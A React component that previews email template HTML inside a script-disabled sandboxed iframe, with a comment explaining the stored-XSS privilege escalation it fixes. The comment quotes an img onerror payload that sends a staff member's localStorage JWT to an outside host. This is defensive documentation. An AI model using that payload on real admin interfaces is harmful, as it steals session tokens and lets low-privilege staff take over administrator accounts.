import { useEffect, useRef, useState } from "react";

/**
 * Renders an email template's rendered HTML body for staff to check
 * before sending.
 *
 * Inside a sandboxed iframe, deliberately, rather than with
 * dangerouslySetInnerHTML -- which is what both preview panes used to do.
 *
 * An email template's body_html is staff-editable free text (Settings ->
 * Email templates, writable by anyone with the Configuration section,
 * which by default is every staff account since an empty allowed_sections
 * means unrestricted). Injected straight into the admin SPA's own DOM, a
 * template body containing
 *
 *     <img src=x onerror="fetch('https://…/?t='+localStorage.access_token)">
 *
 * ran in this origin the moment any other staff member -- including an
 * Admin -- clicked Preview, and the JWT lives in localStorage. That is a
 * support-role-to-admin escalation through a text field.
 *
 * `sandbox` with no allow-* tokens gives the frame a null origin with
 * scripts disabled, so the same markup renders as inert HTML: it cannot
 * reach this page, its storage, or the API. srcdoc keeps it a document of
 * ours rather than a navigation. The height is measured from the content
 * so the pane still sizes itself the way the inline version did.
 */
export default function EmailBodyPreview({ html }: { html: string }) {
  const frameRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(120);

  useEffect(() => {
    const frame = frameRef.current;
    if (!frame) return;
    // Same-origin reads are unavailable in a null-origin sandbox, so the
    // measurement is best-effort: on failure the pane keeps its default
    // height and scrolls internally rather than clipping.
    const measure = () => {
      try {
        const doc = frame.contentDocument;
        if (doc?.documentElement) {
          setHeight(Math.min(Math.max(doc.documentElement.scrollHeight + 16, 80), 600));
        }
      } catch {
        /* sandboxed cross-origin -- keep the default */
      }
    };
    frame.addEventListener("load", measure);
    return () => frame.removeEventListener("load", measure);
  }, [html]);

  return (
    <iframe
      ref={frameRef}
      title="Email body preview"
      sandbox=""
      srcDoc={html}
      style={{ height }}
      className="mt-1 w-full rounded border-0 bg-[var(--surface-1)]"
    />
  );
}
